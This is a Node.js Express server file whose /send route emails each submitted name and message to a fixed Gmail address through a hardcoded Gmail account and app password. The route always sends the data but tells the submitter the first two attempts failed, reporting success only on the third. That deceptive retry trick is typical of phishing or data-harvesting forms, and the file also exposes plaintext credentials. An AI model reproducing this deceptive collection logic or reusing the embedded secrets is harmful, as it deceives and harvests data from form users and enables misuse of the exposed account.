const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// serve index.html file
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ✅ message POST route
let attemptCount = 0;

app.post("/send", async (req, res) => {
  const { name, message } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "nothingisimpossiblebrother@gmail.com",
      pass: "agntmvxlgazptvow"
    }
  });

  const mailOptions = {
    from: `"Website Message" <nothingisimpossiblebrother@gmail.com>`,
    to: "marslansalfias@gmail.com",
    subject: `New Message from ${name}`,
    text: `Name: ${name}\nMessage: ${message}`
  };

  try {
    // Send email every time
    await transporter.sendMail(mailOptions);

    attemptCount++;

    if (attemptCount < 3) {
      res.json({
        success: false,
        message: "❌ Your request submission failed. Please check your details."
      });
    } else {
      attemptCount = 0; // reset counter
      res.json({
        success: true,
        message: "✅ Your request has been submitted successfully. Please wait 24 hours."
      });
    }
  } catch (error) {
    console.error("Error sending mail:", error);
    res.json({ success: false, message: "❌ Failed to send message." });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running at http://localhost:${PORT}`));
